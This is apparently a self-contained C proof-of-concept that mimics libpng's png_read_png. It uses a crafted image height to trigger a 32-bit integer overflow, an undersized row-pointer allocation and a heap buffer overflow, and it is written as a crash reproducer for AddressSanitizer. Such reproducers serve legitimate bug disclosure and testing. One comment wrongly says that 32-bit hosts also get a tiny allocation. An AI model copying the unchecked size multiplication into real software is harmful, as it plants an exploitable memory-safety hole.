#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>

/* Minimal type re-declarations to mirror libpng's public types */
typedef uint8_t  png_byte;
typedef uint32_t png_uint_32;

typedef struct png_struct_def png_struct;
typedef struct png_info_def  png_info;
typedef png_struct* png_structp;
typedef png_info*  png_infop;

struct png_info_def {
  png_uint_32 height;        /* image height (rows) */
  png_byte  **row_pointers;  /* array of row pointers */
  png_uint_32 rowbytes;      /* bytes per row (unused for the crash) */
  png_uint_32 free_me;
  png_uint_32 valid;
};

/* Dummy flags just to mirror the real code */
#define PNG_FREE_ROWS  (1u<<0)
#define PNG_INFO_IDAT  (1u<<1)

/* Stubs for functions normally supplied by libpng */
static void png_free_data(png_structp png_ptr, png_infop info_ptr, int what, int never)
{
  (void)png_ptr; (void)never;
  if ((what & PNG_FREE_ROWS) && info_ptr && info_ptr->row_pointers) {
    free(info_ptr->row_pointers);
    info_ptr->row_pointers = NULL;
  }
}

static void* png_malloc(png_structp png_ptr, size_t size)
{
  (void)png_ptr;
  void *p = malloc(size);
  if (!p) {
    fprintf(stderr, "png_malloc failed to allocate %zu bytes\n", size);
    exit(1);
  }
  return p;
}

#define png_voidcast(T, v) ((T)(v))

/* Vulnerable function re-implemented to reflect the buggy allocation and loops
 * from pngread.c:1133-1149. We intentionally perform the multiplication in
 * 32-bit arithmetic to model the 32-bit-build overflow behavior.
 */
static void png_read_png(png_structp png_ptr, png_infop info_ptr, int transforms, void *params)
{
  (void)transforms; (void)params;

  /* ...skipping prior transforms and updates... */

  /* Start of vulnerable region */
  png_free_data(png_ptr, info_ptr, PNG_FREE_ROWS, 0);
  if (info_ptr->row_pointers == NULL)
  {
    png_uint_32 iptr;

    /* BUG: unchecked multiplication performed in 32-bit arithmetic */
    uint32_t bytes32 = (uint32_t)info_ptr->height * (uint32_t)sizeof(png_byte*);
    size_t alloc_size = (size_t)bytes32; /* passes wrapped size to allocator */

    info_ptr->row_pointers = png_voidcast(png_byte **,
        png_malloc(png_ptr, alloc_size));

    /* This loop writes up to info_ptr->height entries regardless of the
     * undersized allocation above, causing heap buffer overflow.
     */
    for (iptr = 0; iptr < info_ptr->height; iptr++)
      info_ptr->row_pointers[iptr] = NULL; /* ASan should report here */

    info_ptr->free_me |= PNG_FREE_ROWS;

    for (iptr = 0; iptr < info_ptr->height; iptr++)
      info_ptr->row_pointers[iptr] = png_voidcast(png_byte *,
          png_malloc(png_ptr, info_ptr->rowbytes));
  }

  /* ...rest of function omitted... */
}

int main(void)
{
  /* Set up a minimal png_info and png_struct (unused) */
  png_struct *png_ptr = NULL;
  png_info *info = (png_info*)calloc(1, sizeof(*info));
  if (!info) {
    perror("calloc");
    return 1;
  }

  /* Crafted height to force 32-bit overflow of height * sizeof(png_byte*)
   * On 64-bit hosts (sizeof(void*)==8):  height = 0x20000002
   *   8 * 0x20000002 = 0x100000010 -> wraps to 0x10 (16 bytes) in 32-bit.
   * On 32-bit hosts (sizeof(void*)==4), this value still yields a tiny alloc.
   */
  info->height = 0x20000002u; /* 536,870,914 rows */
  info->row_pointers = NULL;
  info->rowbytes = 1; /* small row size to keep per-row allocs tiny (not reached before crash) */

  fprintf(stderr, "Pointer size: %zu, crafted height: %u\n", sizeof(void*), info->height);

  /* Call the vulnerable function; it will allocate a tiny row pointer array
   * due to 32-bit overflow and then immediately overflow it in the first loop.
   */
  png_read_png(png_ptr, info, 0, NULL);

  /* Not reached if ASan catches the overflow */
  free(info);
  return 0;
}
